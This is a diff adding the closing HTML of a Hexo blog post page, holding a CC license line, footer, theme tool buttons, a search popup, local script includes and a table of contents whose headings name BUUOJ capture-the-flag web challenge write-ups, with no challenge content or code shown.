+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">BUUOJ——WEB（一）</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="nav-text">[极客大挑战 2019]EasySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E5%8F%8A%E5%B0%9D%E8%AF%95"><span class="nav-text">一些问题及尝试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%92%B8%E7%8C%AB"><span class="nav-text">[极客大挑战 2019]Havefun-一起来撸猫~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="nav-text">[ACTF2020 新生赛]Include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-text">[强网杯 2019]随便注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp"><span class="nav-text">Exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WP"><span class="nav-text">WP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%81%97%E7%95%99%E9%97%AE%E9%A2%98"><span class="nav-text">遗留问题:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-EasySQL-1"><span class="nav-text">[SUCTF 2019]EasySQL 1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-1"><span class="nav-text">Exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WP-1"><span class="nav-text">WP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%81%97%E7%95%99%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-text">遗留的问题</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Forestsetyou</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
